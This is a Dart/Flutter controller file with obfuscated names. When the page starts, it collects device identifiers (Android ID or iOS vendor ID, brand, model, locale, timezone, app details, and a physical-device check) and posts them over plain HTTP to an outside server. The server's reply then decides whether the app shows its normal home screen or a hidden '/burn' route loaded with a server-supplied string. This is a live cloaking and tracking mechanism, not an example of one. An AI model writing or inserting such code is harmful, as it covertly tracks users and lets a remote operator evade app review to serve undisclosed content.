import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var ohiuregda = RxBool(false);
  var lnydzimxtj = RxBool(true);
  var gvpcrml = RxString("");
  var jeffrey = RxBool(false);
  var klocko = RxBool(true);
  final kzajmxsb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    zpatihgu();
  }


  Future<void> zpatihgu() async {

    jeffrey.value = true;
    klocko.value = true;
    lnydzimxtj.value = false;

    kzajmxsb.post("http://nas.kariom.online/jzexhgyirdvm",data: await clxihegpon()).then((value) {
      var xjzgc = value.data["xjzgc"] as String;
      var izvd = value.data["izvd"] as bool;
      if (izvd) {
        gvpcrml.value = xjzgc;
        roslyn();
      } else {
        kunze();
      }
    }).catchError((e) {
      lnydzimxtj.value = true;
      klocko.value = true;
      jeffrey.value = false;
    });
  }

  Future<Map<String, dynamic>> clxihegpon() async {
    final DeviceInfoPlugin tjsckg = DeviceInfoPlugin();
    PackageInfo mitd_azgienl = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var fgxvowcs = Platform.localeName;
    var at_UZlTVE = currentTimeZone;

    var at_pAgGX = mitd_azgienl.packageName;
    var at_pmoQFWM = mitd_azgienl.version;
    var at_ljvJyIV = mitd_azgienl.buildNumber;

    var at_OQr = mitd_azgienl.appName;
    var at_WtE = "";
    var at_GKHCxchA  = "";
    var stephonStiedemann = "";
    var at_UXdWxBl = "";
    var jacintoReynolds = "";
    var alvenaConn = "";


    var at_oVIK = "";
    var at_fE = false;

    if (GetPlatform.isAndroid) {
      at_oVIK = "android";
      var ctyariehs = await tjsckg.androidInfo;

      at_UXdWxBl = ctyariehs.brand;

      at_WtE  = ctyariehs.model;
      at_GKHCxchA = ctyariehs.id;

      at_fE = ctyariehs.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      at_oVIK = "ios";
      var eicftxowqa = await tjsckg.iosInfo;
      at_UXdWxBl = eicftxowqa.name;
      at_WtE = eicftxowqa.model;

      at_GKHCxchA = eicftxowqa.identifierForVendor ?? "";
      at_fE  = eicftxowqa.isPhysicalDevice;
    }
    var res = {
      "at_pAgGX": at_pAgGX,
      "at_OQr": at_OQr,
      "at_ljvJyIV": at_ljvJyIV,
      "at_WtE": at_WtE,
      "at_oVIK": at_oVIK,
      "at_UZlTVE": at_UZlTVE,
      "at_UXdWxBl": at_UXdWxBl,
      "at_pmoQFWM": at_pmoQFWM,
      "at_GKHCxchA": at_GKHCxchA,
      "fgxvowcs": fgxvowcs,
      "at_fE": at_fE,
      "stephonStiedemann" : stephonStiedemann,
      "jacintoReynolds" : jacintoReynolds,
      "alvenaConn" : alvenaConn,

    };
    return res;
  }

  Future<void> kunze() async {
    Get.offAllNamed("/home");
  }

  Future<void> roslyn() async {
    Get.offAllNamed("/burn");
  }

}
